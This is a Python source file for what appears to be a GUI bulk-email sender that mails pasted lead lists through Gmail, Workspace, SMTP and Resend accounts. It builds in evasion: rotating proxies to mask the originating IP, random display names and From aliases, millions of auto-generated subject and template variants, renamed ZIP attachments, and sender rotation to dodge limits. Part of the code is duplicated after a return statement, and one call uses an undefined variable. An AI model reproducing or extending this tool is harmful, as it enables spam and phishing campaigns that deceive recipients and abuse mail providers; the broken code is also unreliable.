        # 🆕 V87: Use msg's From (already has random Display Name applied via _build_mime)
        from_addr = msg.get("From", "")
        if not from_addr:
            # Fall back to configured from_email
            from_addr = self.resend_from_email.get().strip()
            if not from_addr:
                raise ValueError("Resend From email not set")
        
        # Extract subject + html body
        subject = msg.get("Subject", "")
        html_body = ""
        text_body = ""
        attachments_list = []
        
        if msg.is_multipart():
            for part in msg.walk():
                ctype = part.get_content_type()
                disp = str(part.get("Content-Disposition", ""))
                
                if "attachment" in disp:
                    # Attachment
                    filename = part.get_filename()
                    if filename:
                        try:
                            payload = part.get_payload(decode=True)
                            if payload:
                                import base64 as _b64
                                attachments_list.append({
                                    "filename": filename,
                                    "content": _b64.b64encode(payload).decode("ascii"),
                                })
                        except: pass
                elif ctype == "text/html":
                    try:
                        html_body = part.get_payload(decode=True).decode("utf-8", errors="replace")
                    except: pass
                elif ctype == "text/plain":
                    try:
                        text_body = part.get_payload(decode=True).decode("utf-8", errors="replace")
                    except: pass
        else:
            ctype = msg.get_content_type()
            try:
                body = msg.get_payload(decode=True).decode("utf-8", errors="replace")
                if ctype == "text/html":
                    html_body = body
                else:
                    text_body = body
            except: pass
        
        # Build Resend payload
        payload = {
            "from": from_addr,
            "to": [recipient_email],
            "subject": subject,
        }
        if html_body:
            payload["html"] = html_body
        if text_body and not html_body:
            payload["text"] = text_body
        if attachments_list:
            payload["attachments"] = attachments_list
        
        # Optional Reply-To
        reply_to = msg.get("Reply-To", "")
        if reply_to:
            payload["reply_to"] = reply_to
        
        # 🆕 V87: Proxy support for Resend API
        proxy = None
        proxies_dict = None
        if hasattr(self, 'proxy_tab') and self.proxy_tab.enabled.get():
            target = self.proxy_tab.proxy_target.get()
            if target in ("resend", "all"):
                proxy = self.proxy_tab.get_random_proxy()
                if proxy:
                    proxy_url = ""
                    user_pass = ""
                    if proxy.get("user") and proxy.get("password"):
                        user_pass = f"{proxy['user']}:{proxy['password']}@"
                    
                    if proxy["type"] == "socks5":
                        proxy_url = f"socks5h://{user_pass}{proxy['host']}:{proxy['port']}"
                    elif proxy["type"] == "socks4":
                        proxy_url = f"socks4://{user_pass}{proxy['host']}:{proxy['port']}"
                    else:  # http
                        proxy_url = f"http://{user_pass}{proxy['host']}:{proxy['port']}"
                    
                    proxies_dict = {
                        "http": proxy_url,
                        "https": proxy_url,
                    }
        
        # Send via Resend
        max_retries = 3 if self.resend_auto_retry.get() else 1
        retry_delay = int(self.resend_retry_delay.get() or "10")
        
        for attempt in range(max_retries):
            try:
                req_kwargs = {
                    "headers": {
                        "Authorization": f"Bearer {api_key}",
                        "Content-Type": "application/json",
                    },
                    "json": payload,
                    "timeout": 30,
                }
                if proxies_dict:
                    req_kwargs["proxies"] = proxies_dict
                
                r = requests.post("https://api.resend.com/emails", **req_kwargs)
                
                if r.status_code == 200:
                    return True
                
                if r.status_code == 429:
                    # Rate limited
                    if attempt < max_retries - 1:
                        self._log(f"⏳ Resend 429 — waiting {retry_delay}s...", C["yellow"])
                        time.sleep(retry_delay)
                        continue
                    raise Exception(f"Rate limit (429): {r.text[:100]}")
                
                # Other errors
                raise Exception(f"HTTP {r.status_code}: {r.text[:200]}")
            
            except requests.exceptions.Timeout:
                if attempt < max_retries - 1:
                    time.sleep(2)
                    continue
                raise Exception("Resend timeout")
            except requests.exceptions.ProxyError as pe:
                # Proxy failed — try without proxy
                if proxies_dict and attempt < max_retries - 1:
                    self._log(f"⚠️ Proxy error — retrying without proxy: {str(pe)[:80]}", C["yellow"])
                    proxies_dict = None
                    continue
                raise
            except Exception as e:
                if attempt < max_retries - 1 and "429" in str(e):
                    time.sleep(retry_delay)
                    continue
                raise
        
        return True
    
        # Extract subject + html body
        subject = msg.get("Subject", "")
        html_body = ""
        text_body = ""
        attachments_list = []
        
        if msg.is_multipart():
            for part in msg.walk():
                ctype = part.get_content_type()
                disp = str(part.get("Content-Disposition", ""))
                
                if "attachment" in disp:
                    # Attachment
                    filename = part.get_filename()
                    if filename:
                        try:
                            payload = part.get_payload(decode=True)
                            if payload:
                                import base64 as _b64
                                attachments_list.append({
                                    "filename": filename,
                                    "content": _b64.b64encode(payload).decode("ascii"),
                                })
                        except: pass
                elif ctype == "text/html":
                    try:
                        html_body = part.get_payload(decode=True).decode("utf-8", errors="replace")
                    except: pass
                elif ctype == "text/plain":
                    try:
                        text_body = part.get_payload(decode=True).decode("utf-8", errors="replace")
                    except: pass
        else:
            ctype = msg.get_content_type()
            try:
                body = msg.get_payload(decode=True).decode("utf-8", errors="replace")
                if ctype == "text/html":
                    html_body = body
                else:
                    text_body = body
            except: pass
        
        # Build Resend payload
        payload = {
            "from": from_addr,
            "to": [recipient_email],
            "subject": subject,
        }
        if html_body:
            payload["html"] = html_body
        if text_body and not html_body:
            payload["text"] = text_body
        if attachments_list:
            payload["attachments"] = attachments_list
        
        # Optional Reply-To
        reply_to = msg.get("Reply-To", "")
        if reply_to:
            payload["reply_to"] = reply_to
        
        # Send via Resend
        max_retries = 3 if self.resend_auto_retry.get() else 1
        retry_delay = int(self.resend_retry_delay.get() or "10")
        
        for attempt in range(max_retries):
            try:
                r = requests.post(
                    "https://api.resend.com/emails",
                    headers={
                        "Authorization": f"Bearer {api_key}",
                        "Content-Type": "application/json",
                    },
                    json=payload,
                    timeout=30
                )
                
                if r.status_code == 200:
                    return True
                
                if r.status_code == 429:
                    # Rate limited
                    if attempt < max_retries - 1:
                        self._log(f"⏳ Resend 429 — waiting {retry_delay}s...", C["yellow"])
                        time.sleep(retry_delay)
                        continue
                    raise Exception(f"Rate limit (429): {r.text[:100]}")
                
                # Other errors
                raise Exception(f"HTTP {r.status_code}: {r.text[:200]}")
            
            except requests.exceptions.Timeout:
                if attempt < max_retries - 1:
                    time.sleep(2)
                    continue
                raise Exception("Resend timeout")
            except Exception as e:
                if attempt < max_retries - 1 and "429" in str(e):
                    time.sleep(retry_delay)
                    continue
                raise
        
        return True
    
    def _send_via_api(self, svc, msg):
        raw = base64.urlsafe_b64encode(msg.as_bytes()).decode()
        svc.users().messages().send(userId="me", body={"raw":raw}).execute()

    def _get_oauth_token(self, user_email):
        """Get OAuth2 access token for SMTP XOAUTH2 via service account"""
        sa_path = self.sa_file.get().strip()
        creds = service_account.Credentials.from_service_account_file(
            sa_path, scopes=SCOPES)
        creds = creds.with_subject(user_email)
        import google.auth.transport.requests
        creds.refresh(google.auth.transport.requests.Request())
        return creds.token

    def _send_via_workspace_smtp(self, user_email, msg):
        """Send via SMTP using OAuth2 token — proxy IP shows in X-Originating-IP"""
        token = self._get_oauth_token(user_email)
        auth_str = f"user={user_email}\x01auth=Bearer {token}\x01\x01"
        auth_b64 = base64.b64encode(auth_str.encode()).decode()

        # Build SMTP via proxy
        proxy = self.proxy_tab.get_random_proxy() if self.proxy_tab.enabled.get() and self.proxy_tab.proxy_target.get() in ("smtp","both","all") else None

        if proxy:
            try:
                import socks
                if proxy["type"] == "socks5":
                    ptype = socks.SOCKS5
                elif proxy["type"] == "socks4":
                    ptype = socks.SOCKS4
                else:
                    ptype = socks.HTTP
                socks.setdefaultproxy(ptype, proxy["host"], proxy["port"],
                                      username=proxy["user"] or None,
                                      password=proxy["password"] or None)
                socks.wrapmodule(smtplib)
                proxy_str = f"{proxy['type']}://{proxy['host']}:{proxy['port']}"
            except ImportError:
                proxy_str = "direct"
        else:
            import socket
            smtplib.socket = socket
            proxy_str = "direct"

        # OAuth2 SMTP m3a smtp.gmail.com (mashi smtp-relay — bach mafichi nhitto limit)
        server = smtplib.SMTP("smtp.gmail.com", 587, timeout=20)
        server.ehlo()
        server.starttls()
        server.ehlo()
        server.docmd("AUTH", "XOAUTH2 " + auth_b64)
        
        # Envelope sender = user_email (mashi alias bach mafichi nrejected)
        server.sendmail(user_email, msg["To"], msg.as_string())
        server.quit()

        # restore socket
        try:
            import socket
            smtplib.socket = socket
        except:
            pass

        return proxy_str

    def _send_via_oauth2_smtp(self, email, creds, msg):
        """Send via SMTP using OAuth2 XOAUTH2 (service account delegation)."""
        import google.auth.transport.requests as _gatr
        if not creds.valid or not creds.token:
            creds.refresh(_gatr.Request())
        raw = f"user={email}\x01auth=Bearer {creds.token}\x01\x01"
        auth_b64 = base64.b64encode(raw.encode()).decode()

        proxy = None
        if self.proxy_tab.enabled.get() and self.proxy_tab.proxy_target.get() in ("smtp", "oauth2", "both", "all"):
            proxy = self.proxy_tab.get_random_proxy()

        proxy_str = "direct"
        if proxy:
            try:
                import socks
                ptype = {"socks5": socks.SOCKS5, "socks4": socks.SOCKS4}.get(proxy["type"], socks.HTTP)
                socks.setdefaultproxy(ptype, proxy["host"], proxy["port"],
                                      username=proxy["user"] or None,
                                      password=proxy["password"] or None)
                socks.wrapmodule(smtplib)
                proxy_str = f"{proxy['type']}://{proxy['host']}:{proxy['port']}"
            except ImportError:
                proxy_str = "direct"
        else:
            import socket as _sock
            smtplib.socket = _sock

        # OAuth2 SMTP m3a smtp.gmail.com (Gmail send API limits, mashi SMTP relay limits)
        server = smtplib.SMTP("smtp.gmail.com", 587, timeout=20)
        server.ehlo()
        server.starttls()
        server.ehlo()
        code, resp = server.docmd("AUTH", "XOAUTH2 " + auth_b64)
        if code not in (235, 334):
            server.quit()
            raise Exception(f"XOAUTH2 auth failed ({code}): {resp}")
        
        # Envelope sender = email (user authenticated, mafichi alias)
        server.sendmail(email, msg["To"], msg.as_string())
        server.quit()

        try:
            import socket as _sock2
            smtplib.socket = _sock2
        except Exception:
            pass

        return proxy_str

    def _send_via_smtp(self, smtp_cfg, msg):
        server, proxy_used = self.proxy_tab.build_smtp_with_proxy(smtp_cfg)
        # 🎭 Extract envelope sender mn "From" header (l alias support)
        envelope_from = self._extract_email_from_header(msg.get("From", smtp_cfg["user"])) or smtp_cfg["user"]
        server.sendmail(envelope_from, msg["To"], msg.as_string())
        server.quit()
        return proxy_used

    def _start_loading_animation(self):
        """Start animated loading indicator"""
        self._loading_active = True
        self._loading_step = 0
        self._tick_loading()
    
    def _stop_loading_animation(self):
        """Stop animated loading indicator"""
        self._loading_active = False
        try:
            self.loading_label.config(text="")
            self.loading_dots_label.config(text="")
        except: pass
    
    def _tick_loading(self):
        """Animate loading frame by frame"""
        if not self._loading_active:
            return
        
        try:
            # Spinning circle frames
            spinners = ["⠋", "⠙", "⠹", "⠸", "⠼", "⠴", "⠦", "⠧", "⠇", "⠏"]
            spin_char = spinners[self._loading_step % len(spinners)]
            
            # Animated dots
            dots_count = (self._loading_step // 2) % 4
            dots = "." * dots_count + " " * (3 - dots_count)
            
            # Get progress info
            try:
                cur = int(self.progress["value"])
                tot = int(self.progress["maximum"])
                if tot > 0:
                    pct = (cur / tot) * 100
                    msg = f"{spin_char}  Sending  {cur}/{tot}  ({pct:.1f}%){dots}"
                else:
                    msg = f"{spin_char}  Initializing{dots}"
            except:
                msg = f"{spin_char}  Sending{dots}"
            
            self.loading_label.config(text=msg)
            self._loading_step += 1
            
            # Re-tick after 100ms (10 fps animation)
            self.after(100, self._tick_loading)
        except: pass
    
    def _pause_send(self):
        if self._sending and not self._paused:
            self._paused = True
            self._log("⏸ Paused — click Resume to continue", C["yellow"])

    def _resume_send(self):
        if self._paused:
            self._paused = False
            self._log("▶▶ Resumed", C["green"])

    def _stop_send(self):
        self._sending = False
        self._paused = False
        self._stop_loading_animation()
        self._log("■ Stopped", C["red"])

    def _send_test_inline(self):
        """
        🧪 Send TEST email mn INLINE UI f Sender tab (bla popup).
        Khdma f BACKGROUND — main send mafichi y'pause.
        """
        test_email = self.test_email_var.get().strip()
        try:
            count = int(self.test_count_var.get())
            count = max(1, min(20, count))  # Limit 1-20
        except:
            count = 1
        
        # Validation
        if not test_email or '@' not in test_email:
            self.test_status_lbl.config(text="❌ Email ghalat!", fg=C["red"])
            return
        
        send_mode = self.send_mode.get()
        if not self.services and send_mode == "api":
            self.test_status_lbl.config(text="❌ Connect API accounts first", fg=C["red"])
            return
        if not self.oa_services and send_mode == "oauth2_smtp":
            self.test_status_lbl.config(text="❌ Connect OAuth2 SMTP first", fg=C["red"])
            return
        
        if self.body_mode.get() == "manual":
            body_text = self.body.get("1.0","end").strip()
            if not body_text:
                self.test_status_lbl.config(text="❌ Enter body wla switch l Random Templates", fg=C["red"])
                return
        
        if self.subj_mode.get() == "manual":
            if not self.subject.get().strip():
                self.test_status_lbl.config(text="❌ Enter subject wla switch l Random List", fg=C["red"])
                return
        
        # Show progress
        self.test_status_lbl.config(text=f"⏳ Sending {count} test email(s)...", fg=C["yellow"])
        
        # Run f background thread
        def task():
            self._run_test_send(test_email, count, self.test_status_lbl, None)
        
        threading.Thread(target=task, daemon=True).start()
    
    def _send_test_email(self):
        """
        🧪 Send TEST email l email dyalek b nfs logic dyal real SEND.
        
        Y'use:
          - Random display name (mn list wla auto-generated)
          - Random subject (mn list wla auto-generated)
          - Random HTML template (mn list wla auto-generated)
          - Random/Fixed attachments
          - Personalization [NAME] + [EMAIL]
          - Same alias rotation (ila enabled)
          - Same send mode (OAuth2/SMTP/etc)
        
        Khdma f BACKGROUND — main send mafichi y'pause!
        """
        # Dialog bach user yktab email dyalo
        dlg = tk.Toplevel(self)
        dlg.title("🧪 Send Test Email")
        dlg.geometry("520x310")
        dlg.configure(bg=C["bg1"])
        dlg.transient(self.winfo_toplevel())
        dlg.grab_set()
        
        # Header
        tk.Label(dlg, text="🧪 Send Test Email",
                 bg=C["bg1"], fg=C["text"],
                 font=("Segoe UI", 13, "bold")).pack(pady=(20, 5))
        
        tk.Label(dlg,
                 text="Test email kay'use NAFS logic dyal real SEND:\nrandom name + subject + template + attachments\n+ personalization [NAME] [EMAIL]",
                 bg=C["bg1"], fg=C["text2"],
                 font=("Segoe UI", 8), justify="center").pack(pady=(0, 15))
        
        # Email input
        f = tk.Frame(dlg, bg=C["bg1"])
        f.pack(fill="x", padx=30, pady=(0, 8))
        tk.Label(f, text="Test recipient email:",
                 bg=C["bg1"], fg=C["text2"],
                 font=("Segoe UI", 9)).pack(anchor="w")
        
        email_var = tk.StringVar()
        email_entry = tk.Entry(f, textvariable=email_var,
                                font=("Segoe UI", 11),
                                bg=C["input"], fg=C["text"],
                                insertbackground=C["accent"],
                                relief="flat", bd=0,
                                highlightthickness=2,
                                highlightbackground=C["border2"],
                                highlightcolor=C["accent"])
        email_entry.pack(fill="x", ipady=8, pady=(4, 0))
        email_entry.focus()
        
        # Optional: number of test emails
        nf = tk.Frame(dlg, bg=C["bg1"])
        nf.pack(fill="x", padx=30, pady=(8, 0))
        tk.Label(nf, text="Number of test emails (3la 7sab kanchouf variations):",
                 bg=C["bg1"], fg=C["text2"],
                 font=("Segoe UI", 8)).pack(anchor="w")
        
        count_var = tk.IntVar(value=1)
        count_frame = tk.Frame(nf, bg=C["bg1"])
        count_frame.pack(anchor="w", pady=(4, 0))
        for n in [1, 3, 5, 10]:
            tk.Radiobutton(count_frame, text=str(n),
                           variable=count_var, value=n,
                           bg=C["bg1"], fg=C["text2"],
                           selectcolor=C["bg3"],
                           activebackground=C["bg1"],
                           font=("Segoe UI", 9)).pack(side="left", padx=(0, 12))
        
        # Status
        status_lbl = tk.Label(dlg, text="", bg=C["bg1"], fg=C["text3"],
                               font=("Segoe UI", 8))
        status_lbl.pack(pady=(10, 0))
        
        # Buttons
        btn_f = tk.Frame(dlg, bg=C["bg1"])
        btn_f.pack(pady=(15, 0))
        
        def do_send_test():
            test_email = email_var.get().strip()
            count = count_var.get()
            
            if not test_email or '@' not in test_email:
                status_lbl.config(text="❌ Email ghalat!", fg=C["red"])
                return
            
            # Validate setup l'awwal
            send_mode = self.send_mode.get()
            if not self.services and send_mode == "api":
                messagebox.showerror("Error","Connect API accounts first", parent=dlg)
                return
            if not self.oa_services and send_mode == "oauth2_smtp":
                messagebox.showerror("Error","Connect OAuth2 SMTP accounts first", parent=dlg)
                return
            
            # Body validation
            if self.body_mode.get() == "manual":
                body_text = self.body.get("1.0","end").strip()
                if not body_text:
                    messagebox.showerror("Error","Enter body wla switch l Random Templates", parent=dlg)
                    return
            
            # Subject validation
            if self.subj_mode.get() == "manual":
                if not self.subject.get().strip():
                    messagebox.showerror("Error","Enter subject wla switch l Random List", parent=dlg)
                    return
            
            # Disable button + show progress
            status_lbl.config(text=f"⏳ Sending {count} test email(s)...", fg=C["yellow"])
            
            def task():
                self._run_test_send(test_email, count, status_lbl, dlg)
            
            threading.Thread(target=task, daemon=True).start()
        
        ABtn(btn_f, "🧪 Send Test", C["green"], do_send_test, w=140).pack(side="left", padx=(0, 8))
        ABtn(btn_f, "Cancel", C["bg3"], dlg.destroy, w=90).pack(side="left")
        
        # Bind Enter
        email_entry.bind("<Return>", lambda e: do_send_test())
    
    def _run_test_send(self, test_email, count, status_lbl, dlg):
        """
        Execute test send b NAFS logic dyal real send.
        Khdma f thread separate bach main send mafichi y'pause.
        """
        sent_count = 0
        fail_count = 0
        send_mode = self.send_mode.get()
        
        # Build sender pool (1 sender ila kayan, mafichi mass!)
        if send_mode == "api":
            senders = list(self.services.keys())
            sender_type = "api"
        elif send_mode == "oauth2_smtp":
            senders = list(self.oa_services.keys())
            sender_type = "oauth2_smtp"
        elif send_mode == "workspace_smtp":
            senders = list(self.services.keys())
            sender_type = "workspace_smtp"
        elif send_mode == "resend":
            # 📨 Resend API mode
            api_key = self.resend_api_key.get().strip() if hasattr(self, 'resend_api_key') else ""
            from_email = self.resend_from_email.get().strip() if hasattr(self, 'resend_from_email') else ""
            if not api_key or not from_email:
                self.after(0, lambda: status_lbl.config(text="❌ Resend API not configured!", fg=C["red"]))
                self._log("🧪 Test failed: Configure Resend API tab first", C["red"])
                return
            senders = [from_email]
            sender_type = "resend"
        elif send_mode == "smtp":
            smtp_pairs = self.smtp_tab.get_active_smtp() if hasattr(self, 'smtp_tab') else []
            senders = [s for _, s in smtp_pairs]
            sender_type = "smtp"
        else:  # mixed
            senders = list(self.services.keys()) + list(self.oa_services.keys())
            sender_type = "api"
        
        if not senders:
            self.after(0, lambda: status_lbl.config(text="❌ No senders configured!", fg=C["red"]))
            self._log(f"🧪 Test failed: no senders for mode '{send_mode}'", C["red"])
            return
        
        # Display name source
        display_name_default = self.display_name.get().strip()
        
        # Get manual body/subject ila kaynin
        manual_body = self.body.get("1.0","end").strip()
        manual_subject = self.subject.get().strip()
        
        # Random subject pool (user list)
        subj_user_list = self._get_subj_list()
        auto_subjects = self.subj_mode.get() == "random" and not subj_user_list
        
        self._log(f"🧪 ─── Test send started ({count} email{'s' if count != 1 else ''}) ───", C["accent2"])
        
        for i in range(count):
            try:
                # Pick random sender
                sender_email = random.choice(senders)
                
                # 📋 SUBJECT
                if self.subj_mode.get() == "random":
                    if subj_user_list:
                        subject = random.choice(subj_user_list)
                    else:
                        subject = self._theme_get_subject()
                else:
                    subject = manual_subject
                
                # 👤 DISPLAY NAME
                final_display_name = self._get_random_display_name()
                if not final_display_name:
                    final_display_name = "Test Sender"
                final_display_name = self._personalize_content(final_display_name, test_email)
                
                # 📄 BODY
                if self.body_mode.get() == "random":
                    final_body = self._get_random_body(i)
                else:
                    final_body = manual_body
                
                # 🎭 ALIAS
                alias_from = self._get_random_from(sender_email, i)
                if alias_from == sender_email:
                    alias_from = None
                
                # 📎 RANDOM ATT
                att_mode = self.att_mode.get()
                att_path = None
                if att_mode == "random" and self.attachment_files:
                    att_path = random.choice(self.attachment_files)
                elif att_mode == "same" and self.attachment_files:
                    att_path = self.attachment_files[0]
                
                # 🛠️ Build MIME (b ga3 personalization + fixed atts)
                msg = self._build_mime(
                    sender_email, final_display_name, test_email,
                    subject, final_body, att_path,
                    alias_from=alias_from
                )
                
                # 📧 Send b'7sab mode
                if sender_type == "api" and sender_email in self.services:
                    try:
                        fresh_svc, _proxy = self._get_fresh_api_service(sender_email)
                        self._send_via_api(fresh_svc, msg)
                    except Exception:
                        # Fallback l service
                        self._send_via_api(self.services[sender_email], msg)
                elif sender_type == "oauth2_smtp" and sender_email in self.oa_services:
                    self._send_via_oauth2_smtp(sender_email, self.oa_services[sender_email], msg)
                elif sender_type == "workspace_smtp":
                    self._send_via_workspace_smtp(sender_email, msg)
                elif sender_type == "resend":
                    # 📨 Resend API send
                    self._send_via_resend(msg, lead)
                    # Apply rate limit delay
                    delay_ms = self._get_resend_delay_ms()
                    if delay_ms > 0:
                        time.sleep(delay_ms / 1000.0)
                elif sender_type == "smtp":
                    smtp_cfg = next((s for _, s in self.smtp_tab.get_active_smtp() if s["user"] == sender_email), None)
                    if smtp_cfg:
                        self._send_via_smtp(smtp_cfg, msg)
                    else:
                        raise Exception("SMTP config not found")
                
                sent_count += 1
                
                # Log f main console aussi
                short_subj = subject[:35] + "..." if len(subject) > 35 else subject
                self._log(
                    f"🧪 Test {i+1}/{count} ✓ {test_email} ← {sender_email} | {final_display_name} | {short_subj}",
                    C["green"]
                )
                
                # Update dialog
                self.after(0, lambda s=sent_count, f=fail_count, c=count:
                           status_lbl.config(text=f"✓ Sent: {s}/{c}  ✗ Failed: {f}",
                                              fg=C["green"]))
                
                # Small delay between tests
                if i < count - 1:
                    time.sleep(0.5)
                
            except Exception as e:
                fail_count += 1
                err_str = str(e)[:80]
                self._log(f"🧪 Test {i+1}/{count} ✗ {test_email}: {err_str}", C["red"])
                self.after(0, lambda s=sent_count, f=fail_count, c=count, msg=err_str:
                           status_lbl.config(text=f"✓ {s}/{c}  ✗ {f}  Last error: {msg[:40]}",
                                              fg=C["red"]))
        
        # Final
        self._log(f"🧪 ─── Test send done: {sent_count} sent · {fail_count} failed ───", 
                  C["green"] if fail_count == 0 else C["yellow"])
        
        def _final_update():
            if fail_count == 0:
                status_lbl.config(text=f"✅ All {sent_count} test email(s) sent! Check your inbox.",
                                   fg=C["green"])
            else:
                status_lbl.config(text=f"⚠ {sent_count} sent · {fail_count} failed",
                                   fg=C["yellow"])
        self.after(0, _final_update)
    
    def _start_send(self):
        if not self.services and self.send_mode.get() == "api":
            messagebox.showerror("Error","Connect API accounts first"); return
        if not self.oa_services and self.send_mode.get() == "oauth2_smtp":
            messagebox.showerror("Error","Connect OAuth2 SMTP accounts first"); return
        # 🆕 Resend validation (mode-aware)
        if self.send_mode.get() == "resend":
            if not hasattr(self, 'resend_api_key') or not self.resend_api_key.get().strip():
                messagebox.showerror("Error","Configure Resend API Key first!\nGo to 📨 Resend API tab."); return
            
            # Validate based on from mode
            from_mode = self.resend_from_mode.get() if hasattr(self, 'resend_from_mode') else "single"
            
            if from_mode == "single":
                if not hasattr(self, 'resend_from_email') or not self.resend_from_email.get().strip():
                    messagebox.showerror("Error","Set Resend From Email first!\nGo to 📨 Resend API tab."); return
            elif from_mode == "autogen":
                # Verify domain set
                if not hasattr(self, 'resend_autogen_domain') or not self.resend_autogen_domain.get().strip():
                    messagebox.showerror("Error","Set Auto-Generate Domain first!\nGo to 📨 Resend API tab."); return
                # Auto-generate pool ila empty
                if not self._resend_user_pool:
                    self._generate_resend_user_pool()
                    if not self._resend_user_pool:
                        messagebox.showerror("Error","Failed to generate user pool!"); return
            elif from_mode == "custom":
                text = self.resend_custom_text.get("1.0", "end-1c") if hasattr(self, 'resend_custom_text') else ""
                emails = [l.strip() for l in text.splitlines() if l.strip() and "@" in l]
                if not emails:
                    messagebox.showerror("Error","Custom list is empty!\nGo to 📨 Resend API tab."); return

        # Subject
        # Special marker l "auto-generate per email"
        self._auto_subjects = False
        if self.subj_mode.get() == "random":
            subj_list = self._get_subj_list()
            # 🎯 Ila list fargha → GENERATE dynamically per email (~50K+ unique)
            if not subj_list:
                self._auto_subjects = True
                subjects_pool = []  # placeholder, generated per email
                self._log(f"♾️  Auto-generating subjects (~50,000+ unique combinations)", C["accent2"])
            else:
                subjects_pool = list(subj_list)
                random.shuffle(subjects_pool)
        else:
            s = self.subject.get().strip()
            if not s:
                messagebox.showerror("Error","Enter subject"); return
            subjects_pool = [s]

        body_text = self.body.get("1.0","end").strip()
        display_name = self.display_name.get().strip()
        leads = [l.strip() for l in self.leads_text.get("1.0","end").splitlines() if l.strip()]
        att_mode = self.att_mode.get()
        send_mode = self.send_mode.get()

        # Validate body — ila random + list fargha → log auto-generation
        if self.body_mode.get() == "random":
            if not self.body_templates_list:
                self._log(f"♾️  Auto-generating HTML templates (~21M+ unique combinations)", C["accent2"])
        else:
            if not body_text:
                messagebox.showerror("Error","Enter body"); return
        
        # Validate display name — same fallback
        if self.dn_mode.get() == "random":
            if not self._get_dn_list():
                self._log(f"♾️  Auto-generating display names (~7,000+ unique combinations)", C["accent2"])
        
        if not leads:
            messagebox.showerror("Error","Add leads"); return
        # Validation: ila random mode walakin mafichi files → error
        # Walakin "none" + fixed = OK (kayMchiw fixed safi)
        if att_mode != "none" and not self.attachment_files:
            # Ila kayna fixed attachments, switch automatique l "none" mode
            if self.fixed_attachment_files:
                att_mode = "none"
                self._log(f"📌 Random files mafichi — using ghir fixed attachments ({len(self.fixed_attachment_files)})", C["accent2"])
            else:
                messagebox.showerror("Error","Add files (random wla fixed) wla choose No random"); return

        # Build sender pool
        api_senders = list(self.services.keys()) if send_mode in ("api","mixed") else []
        smtp_pairs = self.smtp_tab.get_active_smtp() if send_mode in ("smtp","mixed") else []
        smtp_senders = [s for _, s in smtp_pairs]
        smtp_tree_items = list(self.smtp_tab.tree.get_children())
        ws_senders = list(self.services.keys()) if send_mode == "workspace_smtp" else []
        oauth2_senders = list(self.oa_services.keys()) if send_mode == "oauth2_smtp" else []
        
        # 🆕 V87: Resend mode — supports single/autogen/custom From emails
        resend_active = (send_mode == "resend")
        resend_senders = []
        if resend_active:
            api_key = self.resend_api_key.get().strip() if hasattr(self, 'resend_api_key') else ""
            if not api_key:
                messagebox.showerror("Error","Resend API Key not configured!\nGo to 📨 Resend API tab.")
                return
            
            # Validate based on from mode
            from_mode = self.resend_from_mode.get() if hasattr(self, 'resend_from_mode') else "single"
            
            if from_mode == "single":
                from_email = self.resend_from_email.get().strip() if hasattr(self, 'resend_from_email') else ""
                if not from_email:
                    messagebox.showerror("Error","Resend From Email not set!\nGo to 📨 Resend API tab.")
                    return
                resend_senders = [from_email]
            
            elif from_mode == "autogen":
                if not self._resend_user_pool:
                    # Auto-generate
                    domain = self.resend_autogen_domain.get().strip()
                    if not domain:
                        messagebox.showerror("Error","Resend auto-gen domain missing!\nGo to 📨 Resend API tab.")
                        return
                    self._generate_resend_user_pool()
                    if not self._resend_user_pool:
                        messagebox.showerror("Error","Failed to generate user pool!")
                        return
                # Mark for runtime random pick (placeholder)
                resend_senders = ["__RESEND_AUTOGEN__"]
                self._log(f"📨 Resend: using auto-gen pool ({len(self._resend_user_pool):,} emails)", C["accent2"])
            
            elif from_mode == "custom":
                text = self.resend_custom_text.get("1.0", "end-1c") if hasattr(self, 'resend_custom_text') else ""
                emails = [l.strip() for l in text.splitlines() if l.strip() and "@" in l]
                if not emails:
                    messagebox.showerror("Error","Resend custom list empty!\nGo to 📨 Resend API tab.")
                    return
                resend_senders = ["__RESEND_CUSTOM__"]
                self._log(f"📨 Resend: using custom list ({len(emails)} emails)", C["accent2"])

        if not api_senders and not smtp_senders and not ws_senders and not oauth2_senders and not resend_senders:
            messagebox.showerror("Error","No senders available"); return

        # Build unified sender pool
        all_senders = []
        for e in api_senders:
            all_senders.append({"type":"api","email":e,"iid":None})
        for idx, s in smtp_pairs:
            iid = smtp_tree_items[idx] if idx < len(smtp_tree_items) else None
            all_senders.append({"type":"smtp","cfg":s,"email":s["user"],"iid":iid,"smtp_idx":idx})
        for e in ws_senders:
            all_senders.append({"type":"workspace_smtp","email":e,"iid":None})
        for e in oauth2_senders:
            all_senders.append({"type":"oauth2_smtp","creds":self.oa_services[e],"email":e,"iid":None})
        for e in resend_senders:
            all_senders.append({"type":"resend","email":e,"iid":None})
        random.shuffle(all_senders)

        # 🎯 SMART ATTACHMENT POOL — keep ZIPs as-is (will rename per email later)
        att_pool = list(self.attachment_files)
        
        if att_mode == "random":
            random.shuffle(att_pool)

        self._current_leads = leads
        self._sending = True
        self._paused = False
        sent_c = [0]; fail_c = [0]
        total = len(leads)

        self.progress["maximum"] = total
        self.progress["value"] = 0
        
        # ⚡ START loading animation
        self._start_loading_animation()
        self._refresh_sent_stat()
        self.stat_fail.config(text="0")
        self._reset_failed_emails_file()

        limit = self.smtp_tab.get_limit()
        n_threads = self.threads_var.get()
        self._log(
            f"▶ Start — {total} leads · {len(all_senders)} senders "
            f"({len(api_senders)} API + {len(smtp_senders)} SMTP + {len(oauth2_senders)} OAuth2) · "
            f"threads={n_threads} · limit/SMTP={limit if limit>0 else '∞'} · "
            f"subj={'rnd' if self.subj_mode.get()=='random' else 'manual'} · att={att_mode}",
            C["accent2"])

        start_idx = self._resume_index
        counter_lock = threading.Lock()

        def _send_one(i, lead):
            if not self._sending:
                return
            while self._paused and self._sending:
                time.sleep(0.2)
            if not self._sending:
                return

            with counter_lock:
                active = [s for s in all_senders
                          if s["type"] in ("api", "workspace_smtp", "oauth2_smtp") or
                          s.get("cfg", {}).get("status") not in ("fail", "maxed")]
                if not active:
                    self._log("⛔ All senders exhausted!", C["red"])
                    self._sending = False
                    return
                sender = active[i % len(active)]

            # 📋 SUBJECT: ila auto mode → generate fresh per email
            if self._auto_subjects:
                subject = self._theme_get_subject()
            else:
                subject = subjects_pool[i % len(subjects_pool)]
            att_path = (None if att_mode=="none"
                        else att_pool[0] if att_mode=="same"
                        else att_pool[i % len(att_pool)])
            try:
                # 🎭 ALIAS ROTATION: Get From email b alias ila enabled (mn Sender tab)
                # ⚠️ NOTE: smtp.gmail.com kayrejected aliases mn "From" automatique
                #        Bach yKhdem alias, lazem smtp-relay.gmail.com (walakin 3andou daily limit)
                alias_from = self._get_random_from(sender["email"], i)
                # Ila mafichi changed (= original), pass None bach _build_mime mafichi y'change
